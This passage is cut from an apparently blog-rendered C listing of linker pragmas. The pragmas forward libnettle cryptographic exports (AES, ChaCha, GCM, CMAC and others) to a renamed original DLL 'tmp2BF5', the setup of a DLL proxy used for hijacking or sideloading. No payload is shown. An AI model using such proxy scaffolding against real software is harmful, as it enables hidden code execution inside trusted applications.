&quot;&#x2F;export:nettle_aes256_decrypt&#x3D;tmp2BF5.nettle_aes256_decrypt,@70&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_aes256_encrypt&#x3D;tmp2BF5.nettle_aes256_encrypt,@71&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_aes256_invert_key&#x3D;tmp2BF5.nettle_aes256_invert_key,@72&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_aes256_set_decrypt_key&#x3D;tmp2BF5.nettle_aes256_set_decrypt_key,@73&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_aes256_set_encrypt_key&#x3D;tmp2BF5.nettle_aes256_set_encrypt_key,@74&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_aes_decrypt&#x3D;tmp2BF5.nettle_aes_decrypt,@75&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_aes_encrypt&#x3D;tmp2BF5.nettle_aes_encrypt,@76&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_aes_invert_key&#x3D;tmp2BF5.nettle_aes_invert_key,@77&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_aes_set_decrypt_key&#x3D;tmp2BF5.nettle_aes_set_decrypt_key,@78&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_aes_set_encrypt_key&#x3D;tmp2BF5.nettle_aes_set_encrypt_key,@79&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_arcfour128_set_key&#x3D;tmp2BF5.nettle_arcfour128_set_key,@80&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_arcfour_crypt&#x3D;tmp2BF5.nettle_arcfour_crypt,@81&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_arcfour_set_key&#x3D;tmp2BF5.nettle_arcfour_set_key,@82&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_arctwo128&#x3D;tmp2BF5.nettle_arctwo128,@83&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_arctwo128_set_key&#x3D;tmp2BF5.nettle_arctwo128_set_key,@84&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_arctwo128_set_key_gutmann&#x3D;tmp2BF5.nettle_arctwo128_set_key_gutmann,@85&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_arctwo40&#x3D;tmp2BF5.nettle_arctwo40,@86&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_arctwo40_set_key&#x3D;tmp2BF5.nettle_arctwo40_set_key,@87&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_arctwo64&#x3D;tmp2BF5.nettle_arctwo64,@88&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_arctwo64_set_key&#x3D;tmp2BF5.nettle_arctwo64_set_key,@89&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_arctwo_decrypt&#x3D;tmp2BF5.nettle_arctwo_decrypt,@90&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_arctwo_encrypt&#x3D;tmp2BF5.nettle_arctwo_encrypt,@91&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_arctwo_gutmann128&#x3D;tmp2BF5.nettle_arctwo_gutmann128,@92&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_arctwo_set_key&#x3D;tmp2BF5.nettle_arctwo_set_key,@93&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_arctwo_set_key_ekb&#x3D;tmp2BF5.nettle_arctwo_set_key_ekb,@94&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_arctwo_set_key_gutmann&#x3D;tmp2BF5.nettle_arctwo_set_key_gutmann,@95&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_base16&#x3D;tmp2BF5.nettle_base16,@96&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_base16_decode_final&#x3D;tmp2BF5.nettle_base16_decode_final,@97&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_base16_decode_init&#x3D;tmp2BF5.nettle_base16_decode_init,@98&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_base16_decode_single&#x3D;tmp2BF5.nettle_base16_decode_single,@99&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_base16_decode_update&#x3D;tmp2BF5.nettle_base16_decode_update,@100&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_base16_encode_single&#x3D;tmp2BF5.nettle_base16_encode_single,@101&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_base16_encode_update&#x3D;tmp2BF5.nettle_base16_encode_update,@102&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_base64&#x3D;tmp2BF5.nettle_base64,@103&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_base64_decode_final&#x3D;tmp2BF5.nettle_base64_decode_final,@104&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_base64_decode_init&#x3D;tmp2BF5.nettle_base64_decode_init,@105&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_base64_decode_single&#x3D;tmp2BF5.nettle_base64_decode_single,@106&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_base64_decode_update&#x3D;tmp2BF5.nettle_base64_decode_update,@107&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_base64_encode_final&#x3D;tmp2BF5.nettle_base64_encode_final,@108&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_base64_encode_group&#x3D;tmp2BF5.nettle_base64_encode_group,@109&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_base64_encode_init&#x3D;tmp2BF5.nettle_base64_encode_init,@110&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_base64_encode_raw&#x3D;tmp2BF5.nettle_base64_encode_raw,@111&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_base64_encode_single&#x3D;tmp2BF5.nettle_base64_encode_single,@112&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_base64_encode_update&#x3D;tmp2BF5.nettle_base64_encode_update,@113&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_base64url&#x3D;tmp2BF5.nettle_base64url,@114&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_base64url_decode_init&#x3D;tmp2BF5.nettle_base64url_decode_init,@115&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_base64url_encode_init&#x3D;tmp2BF5.nettle_base64url_encode_init,@116&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_blowfish128_set_key&#x3D;tmp2BF5.nettle_blowfish128_set_key,@117&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_blowfish_decrypt&#x3D;tmp2BF5.nettle_blowfish_decrypt,@118&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_blowfish_encrypt&#x3D;tmp2BF5.nettle_blowfish_encrypt,@119&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_blowfish_set_key&#x3D;tmp2BF5.nettle_blowfish_set_key,@120&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_buffer_clear&#x3D;tmp2BF5.nettle_buffer_clear,@121&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_buffer_copy&#x3D;tmp2BF5.nettle_buffer_copy,@122&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_buffer_grow&#x3D;tmp2BF5.nettle_buffer_grow,@123&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_buffer_init&#x3D;tmp2BF5.nettle_buffer_init,@124&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_buffer_init_realloc&#x3D;tmp2BF5.nettle_buffer_init_realloc,@125&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_buffer_init_size&#x3D;tmp2BF5.nettle_buffer_init_size,@126&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_buffer_reset&#x3D;tmp2BF5.nettle_buffer_reset,@127&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_buffer_space&#x3D;tmp2BF5.nettle_buffer_space,@128&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_buffer_write&#x3D;tmp2BF5.nettle_buffer_write,@129&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_camellia128&#x3D;tmp2BF5.nettle_camellia128,@130&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_camellia128_crypt&#x3D;tmp2BF5.nettle_camellia128_crypt,@131&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_camellia128_invert_key&#x3D;tmp2BF5.nettle_camellia128_invert_key,@132&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_camellia128_set_encrypt_key&#x3D;tmp2BF5.nettle_camellia128_set_encrypt_key,@133&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_camellia192&#x3D;tmp2BF5.nettle_camellia192,@134&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_camellia192_set_decrypt_key&#x3D;tmp2BF5.nettle_camellia192_set_decrypt_key,@135&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_camellia192_set_encrypt_key&#x3D;tmp2BF5.nettle_camellia192_set_encrypt_key,@136&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_camellia256&#x3D;tmp2BF5.nettle_camellia256,@137&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_camellia256_crypt&#x3D;tmp2BF5.nettle_camellia256_crypt,@138&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_camellia256_invert_key&#x3D;tmp2BF5.nettle_camellia256_invert_key,@139&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_camellia256_set_decrypt_key&#x3D;tmp2BF5.nettle_camellia256_set_decrypt_key,@140&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_camellia256_set_encrypt_key&#x3D;tmp2BF5.nettle_camellia256_set_encrypt_key,@141&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_camellia_set_decrypt_key&#x3D;tmp2BF5.nettle_camellia_set_decrypt_key,@142&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_cast128&#x3D;tmp2BF5.nettle_cast128,@143&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_cast128_decrypt&#x3D;tmp2BF5.nettle_cast128_decrypt,@144&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_cast128_encrypt&#x3D;tmp2BF5.nettle_cast128_encrypt,@145&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_cast128_set_key&#x3D;tmp2BF5.nettle_cast128_set_key,@146&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_cast5_set_key&#x3D;tmp2BF5.nettle_cast5_set_key,@147&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_cbc_decrypt&#x3D;tmp2BF5.nettle_cbc_decrypt,@148&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_cbc_encrypt&#x3D;tmp2BF5.nettle_cbc_encrypt,@149&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_ccm_aes128_decrypt&#x3D;tmp2BF5.nettle_ccm_aes128_decrypt,@150&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_ccm_aes128_decrypt_message&#x3D;tmp2BF5.nettle_ccm_aes128_decrypt_message,@151&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_ccm_aes128_digest&#x3D;tmp2BF5.nettle_ccm_aes128_digest,@152&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_ccm_aes128_encrypt&#x3D;tmp2BF5.nettle_ccm_aes128_encrypt,@153&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_ccm_aes128_encrypt_message&#x3D;tmp2BF5.nettle_ccm_aes128_encrypt_message,@154&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_ccm_aes128_set_key&#x3D;tmp2BF5.nettle_ccm_aes128_set_key,@155&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_ccm_aes128_set_nonce&#x3D;tmp2BF5.nettle_ccm_aes128_set_nonce,@156&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_ccm_aes128_update&#x3D;tmp2BF5.nettle_ccm_aes128_update,@157&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_ccm_aes192_decrypt&#x3D;tmp2BF5.nettle_ccm_aes192_decrypt,@158&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_ccm_aes192_decrypt_message&#x3D;tmp2BF5.nettle_ccm_aes192_decrypt_message,@159&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_ccm_aes192_digest&#x3D;tmp2BF5.nettle_ccm_aes192_digest,@160&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_ccm_aes192_encrypt&#x3D;tmp2BF5.nettle_ccm_aes192_encrypt,@161&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_ccm_aes192_encrypt_message&#x3D;tmp2BF5.nettle_ccm_aes192_encrypt_message,@162&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_ccm_aes192_set_key&#x3D;tmp2BF5.nettle_ccm_aes192_set_key,@163&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_ccm_aes192_set_nonce&#x3D;tmp2BF5.nettle_ccm_aes192_set_nonce,@164&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_ccm_aes192_update&#x3D;tmp2BF5.nettle_ccm_aes192_update,@165&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_ccm_aes256_decrypt&#x3D;tmp2BF5.nettle_ccm_aes256_decrypt,@166&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_ccm_aes256_decrypt_message&#x3D;tmp2BF5.nettle_ccm_aes256_decrypt_message,@167&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_ccm_aes256_digest&#x3D;tmp2BF5.nettle_ccm_aes256_digest,@168&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_ccm_aes256_encrypt&#x3D;tmp2BF5.nettle_ccm_aes256_encrypt,@169&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_ccm_aes256_encrypt_message&#x3D;tmp2BF5.nettle_ccm_aes256_encrypt_message,@170&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_ccm_aes256_set_key&#x3D;tmp2BF5.nettle_ccm_aes256_set_key,@171&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_ccm_aes256_set_nonce&#x3D;tmp2BF5.nettle_ccm_aes256_set_nonce,@172&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_ccm_aes256_update&#x3D;tmp2BF5.nettle_ccm_aes256_update,@173&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_ccm_decrypt&#x3D;tmp2BF5.nettle_ccm_decrypt,@174&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_ccm_decrypt_message&#x3D;tmp2BF5.nettle_ccm_decrypt_message,@175&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_ccm_digest&#x3D;tmp2BF5.nettle_ccm_digest,@176&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_ccm_encrypt&#x3D;tmp2BF5.nettle_ccm_encrypt,@177&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_ccm_encrypt_message&#x3D;tmp2BF5.nettle_ccm_encrypt_message,@178&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_ccm_set_nonce&#x3D;tmp2BF5.nettle_ccm_set_nonce,@179&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_ccm_update&#x3D;tmp2BF5.nettle_ccm_update,@180&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_cfb8_decrypt&#x3D;tmp2BF5.nettle_cfb8_decrypt,@181&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_cfb8_encrypt&#x3D;tmp2BF5.nettle_cfb8_encrypt,@182&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_cfb_decrypt&#x3D;tmp2BF5.nettle_cfb_decrypt,@183&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_cfb_encrypt&#x3D;tmp2BF5.nettle_cfb_encrypt,@184&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_chacha_crypt&#x3D;tmp2BF5.nettle_chacha_crypt,@185&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_chacha_crypt32&#x3D;tmp2BF5.nettle_chacha_crypt32,@186&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_chacha_poly1305&#x3D;tmp2BF5.nettle_chacha_poly1305,@187&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_chacha_poly1305_decrypt&#x3D;tmp2BF5.nettle_chacha_poly1305_decrypt,@188&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_chacha_poly1305_digest&#x3D;tmp2BF5.nettle_chacha_poly1305_digest,@189&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_chacha_poly1305_encrypt&#x3D;tmp2BF5.nettle_chacha_poly1305_encrypt,@190&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_chacha_poly1305_set_key&#x3D;tmp2BF5.nettle_chacha_poly1305_set_key,@191&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_chacha_poly1305_set_nonce&#x3D;tmp2BF5.nettle_chacha_poly1305_set_nonce,@192&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_chacha_poly1305_update&#x3D;tmp2BF5.nettle_chacha_poly1305_update,@193&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_chacha_set_counter&#x3D;tmp2BF5.nettle_chacha_set_counter,@194&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_chacha_set_counter32&#x3D;tmp2BF5.nettle_chacha_set_counter32,@195&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_chacha_set_key&#x3D;tmp2BF5.nettle_chacha_set_key,@196&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_chacha_set_nonce&#x3D;tmp2BF5.nettle_chacha_set_nonce,@197&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_chacha_set_nonce96&#x3D;tmp2BF5.nettle_chacha_set_nonce96,@198&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_cmac128_digest&#x3D;tmp2BF5.nettle_cmac128_digest,@199&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_cmac128_init&#x3D;tmp2BF5.nettle_cmac128_init,@200&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_cmac128_set_key&#x3D;tmp2BF5.nettle_cmac128_set_key,@201&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_cmac128_update&#x3D;tmp2BF5.nettle_cmac128_update,@202&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_cmac64_digest&#x3D;tmp2BF5.nettle_cmac64_digest,@203&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_cmac64_init&#x3D;tmp2BF5.nettle_cmac64_init,@204&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_cmac64_set_key&#x3D;tmp2BF5.nettle_cmac64_set_key,@205&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_cmac64_update&#x3D;tmp2BF5.nettle_cmac64_update,@206&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_cmac_aes128&#x3D;tmp2BF5.nettle_cmac_aes128,@207&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_cmac_aes128_digest&#x3D;tmp2BF5.nettle_cmac_aes128_digest,@208&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_cmac_aes128_set_key&#x3D;tmp2BF5.nettle_cmac_aes128_set_key,@209&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_cmac_aes128_update&#x3D;tmp2BF5.nettle_cmac_aes128_update,@210&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_cmac_aes256&#x3D;tmp2BF5.nettle_cmac_aes256,@211&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_cmac_aes256_digest&#x3D;tmp2BF5.nettle_cmac_aes256_digest,@212&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_cmac_aes256_set_key&#x3D;tmp2BF5.nettle_cmac_aes256_set_key,@213&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_cmac_aes256_update&#x3D;tmp2BF5.nettle_cmac_aes256_update,@214&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_cmac_des3&#x3D;tmp2BF5.nettle_cmac_des3,@215&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_cmac_des3_digest&#x3D;tmp2BF5.nettle_cmac_des3_digest,@216&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_cmac_des3_set_key&#x3D;tmp2BF5.nettle_cmac_des3_set_key,@217&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_cmac_des3_update&#x3D;tmp2BF5.nettle_cmac_des3_update,@218&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_cnd_memcpy&#x3D;tmp2BF5.nettle_cnd_memcpy,@219&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_ctr_crypt&#x3D;tmp2BF5.nettle_ctr_crypt,@220&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_des3_decrypt&#x3D;tmp2BF5.nettle_des3_decrypt,@221&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_des3_encrypt&#x3D;tmp2BF5.nettle_des3_encrypt,@222&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_des3_set_key&#x3D;tmp2BF5.nettle_des3_set_key,@223&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_des_check_parity&#x3D;tmp2BF5.nettle_des_check_parity,@224&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_des_decrypt&#x3D;tmp2BF5.nettle_des_decrypt,@225&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_des_encrypt&#x3D;tmp2BF5.nettle_des_encrypt,@226&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_des_fix_parity&#x3D;tmp2BF5.nettle_des_fix_parity,@227&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_des_set_key&#x3D;tmp2BF5.nettle_des_set_key,@228&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_eax_aes128&#x3D;tmp2BF5.nettle_eax_aes128,@229&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_eax_aes128_decrypt&#x3D;tmp2BF5.nettle_eax_aes128_decrypt,@230&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_eax_aes128_digest&#x3D;tmp2BF5.nettle_eax_aes128_digest,@231&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_eax_aes128_encrypt&#x3D;tmp2BF5.nettle_eax_aes128_encrypt,@232&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_eax_aes128_set_key&#x3D;tmp2BF5.nettle_eax_aes128_set_key,@233&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_eax_aes128_set_nonce&#x3D;tmp2BF5.nettle_eax_aes128_set_nonce,@234&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_eax_aes128_update&#x3D;tmp2BF5.nettle_eax_aes128_update,@235&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_eax_decrypt&#x3D;tmp2BF5.nettle_eax_decrypt,@236&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_eax_digest&#x3D;tmp2BF5.nettle_eax_digest,@237&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_eax_encrypt&#x3D;tmp2BF5.nettle_eax_encrypt,@238&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_eax_set_key&#x3D;tmp2BF5.nettle_eax_set_key,@239&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_eax_set_nonce&#x3D;tmp2BF5.nettle_eax_set_nonce,@240&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_eax_update&#x3D;tmp2BF5.nettle_eax_update,@241&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_gcm_aes128&#x3D;tmp2BF5.nettle_gcm_aes128,@242&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_gcm_aes128_decrypt&#x3D;tmp2BF5.nettle_gcm_aes128_decrypt,@243&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_gcm_aes128_digest&#x3D;tmp2BF5.nettle_gcm_aes128_digest,@244&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_gcm_aes128_encrypt&#x3D;tmp2BF5.nettle_gcm_aes128_encrypt,@245&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_gcm_aes128_set_iv&#x3D;tmp2BF5.nettle_gcm_aes128_set_iv,@246&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_gcm_aes128_set_key&#x3D;tmp2BF5.nettle_gcm_aes128_set_key,@247&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_gcm_aes128_update&#x3D;tmp2BF5.nettle_gcm_aes128_update,@248&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_gcm_aes192&#x3D;tmp2BF5.nettle_gcm_aes192,@249&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_gcm_aes192_decrypt&#x3D;tmp2BF5.nettle_gcm_aes192_decrypt,@250&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_gcm_aes192_digest&#x3D;tmp2BF5.nettle_gcm_aes192_digest,@251&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_gcm_aes192_encrypt&#x3D;tmp2BF5.nettle_gcm_aes192_encrypt,@252&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_gcm_aes192_set_iv&#x3D;tmp2BF5.nettle_gcm_aes192_set_iv,@253&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_gcm_aes192_set_key&#x3D;tmp2BF5.nettle_gcm_aes192_set_key,@254&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_gcm_aes192_update&#x3D;tmp2BF5.nettle_gcm_aes192_update,@255&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_gcm_aes256&#x3D;tmp2BF5.nettle_gcm_aes256,@256&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_gcm_aes256_decrypt&#x3D;tmp2BF5.nettle_gcm_aes256_decrypt,@257&quot;)</span><br><span class="line">#pragma comment(linker, 